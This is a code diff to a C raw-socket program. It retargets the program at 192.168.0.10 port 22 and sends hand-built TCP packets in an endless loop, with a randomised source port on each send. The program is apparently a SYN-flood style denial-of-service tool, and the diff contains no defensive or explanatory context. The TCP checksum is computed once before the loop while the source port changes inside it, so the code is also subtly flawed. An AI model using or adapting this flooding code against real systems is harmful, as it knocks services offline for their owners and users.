@@ -12,7 +12,7 @@
 #include <unistd.h>
 
 #define SOURCE_IP "10.0.0.13"
-#define DEST_IP "192.168.0.1"
+#define DEST_IP "192.168.0.10"
 
 /*
  * The pseudo header that is used in checksum calculations.
@@ -115,7 +115,7 @@ int main(void)
     srand(time(NULL));
     struct tcphdr tcp_header = {
         .source = htons(55555),
-        .dest = htons(80),
+        .dest = htons(22),
         .seq = random(),
         .ack_seq = 0,
         .res1 = 0,
@@ -147,20 +147,21 @@ int main(void)
 
     tcp_header.check = inet_checksum((uint16_t *)&phdr, sizeof phdr);
 
-    char packet_buf[sizeof tcp_header + sizeof ip_header];
-    memcpy(packet_buf, &ip_header, sizeof ip_header);
-    memcpy(packet_buf + sizeof ip_header, &tcp_header, sizeof tcp_header);
-
     struct sockaddr_in sin = {
         .sin_family = AF_INET,
         .sin_addr.s_addr = ip_header.daddr
     };
 
     for (;;) {
+        char packet_buf[sizeof tcp_header + sizeof ip_header];
+        tcp_header.source = htons((random() % 61000 - 32768 + 1) + 32768);
+        memcpy(packet_buf, &ip_header, sizeof ip_header);
+        memcpy(packet_buf + sizeof ip_header, &tcp_header, sizeof tcp_header);
         if (sendto(fd, packet_buf, sizeof packet_buf, 0, (struct sockaddr *)&sin, sizeof sin) == -1) {
             perror("sendto()");
             return 1;
         }
+        usleep(1);
     }
 
     return 0;
